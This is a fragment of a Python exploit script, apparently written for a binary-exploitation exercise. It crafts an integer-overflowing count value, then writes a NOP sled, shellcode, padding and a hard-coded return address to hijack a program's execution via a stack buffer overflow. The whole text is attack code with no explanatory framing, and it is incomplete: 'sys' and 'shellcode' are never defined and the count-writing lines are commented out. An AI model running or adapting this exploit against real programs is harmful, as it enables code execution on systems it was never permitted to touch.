# We need to:
# 1. Choose a count value that when multiplied by sizeof(unsigned int) will cause an integer overflow
# 2. The overflow should result in a small enough buffer that when we write past it, 
#    we can overwrite the return address
# 3. Place our shellcode and overwrite the return address to point to it

# First, write the crafted count value
# We want: count * 4 to overflow to a small value
# Using a large value close to 2^64 / 4
count = (1 << 62) + 1  # When multiplied by 4, this will overflow to 4
#sys.stdout.buffer.write(count.to_bytes(8, 'little'))
#sys.stdout.buffer.write(b"AAAA")
# Write the count in little-endian format
#sys.stdout.buffer.write(count.to_bytes(8, 'little'))



# Calculate padding needed
# We need enough data to reach the return address
nops = b"\x90" * 64
sys.stdout.buffer.write(nops + shellcode)
padding = b"A" * (200)  
sys.stdout.buffer.write(padding)
# Return address - points to middle of our nop sled
ret_addr = 0x7ffffff68fc0
sys.stdout.buffer.write(ret_addr.to_bytes(8, 'little'))

# Write shellcode first so we know its address will be at the start of our buffer
#sys.stdout.buffer.write(shellcode)
#sys.stdout.buffer.write(padding)

# The address we want to jump to (start of our buffer)
# This will need to be adjusted based on the actual stack address
#buffer_addr = 0x7fffffffe140  # Example address - you'll need to find the actual one
#sys.stdout.buffer.write(buffer_addr.to_bytes(8, 'little'))
